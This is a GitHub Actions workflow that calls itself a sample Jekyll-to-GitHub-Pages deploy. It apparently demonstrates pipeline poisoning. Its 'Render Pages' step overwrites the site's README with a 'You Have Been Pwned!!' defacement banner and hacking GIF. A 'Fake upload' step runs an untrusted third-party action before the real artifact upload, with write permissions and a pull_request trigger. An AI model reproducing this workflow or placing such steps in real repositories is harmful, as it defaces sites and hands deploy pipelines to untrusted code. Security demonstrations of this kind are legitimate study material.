# Sample workflow for building and deploying a Jekyll site to GitHub Pages
name: Deploy page

on:
  # Runs on pushes targeting the default branch
  pull_request: 
    branches: ["main"]
  push: 
    branches: ["main"]
    

  # Allows you to run this workflow manually from the Actions tab
  workflow_dispatch:

# Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
permissions:
  contents: write
  pages: write
  id-token: write


# Allow only one concurrent deployment, skipping runs queued between the run in-progress and latest queued.
# However, do NOT cancel in-progress runs as we want to allow these production deployments to complete.
concurrency:
  group: "pages"
  cancel-in-progress: false

jobs:
  # Build job
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v3
      - name: Setup Pages
        uses: actions/configure-pages@v3
      - name: Render Pages
        run: |
           echo '<div><img src="https://media.tenor.com/rePDfDWO3XoAAAAd/hacking.gif" width="518" height="388.5" alt="Hacking GIF - Hacking GIFs" style="max-width: 518px;"></div><p><h2>You Have Been Pwned!!</h2>' > my-app/README.md
      - name: Build with Jekyll
        uses: actions/jekyll-build-pages@v1
        with:
          source: ./my-app
          destination: ./_site
      - name: Fake upload
        uses: josedonizetti/upload-fake-action@v0.1.0   
      - name: Upload artifact
        uses: actions/upload-pages-artifact@v2

  # Deployment job
  deploy:
    runs-on: ubuntu-latest
    needs: build
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    if: ${{ github.ref_name == 'main' && (github.event_name == 'push' || github.event_name == 'workflow_dispatch') }}
    steps:
      - name: Deploy to GitHub Pages
        id: deployment
        uses: actions/deploy-pages@v2
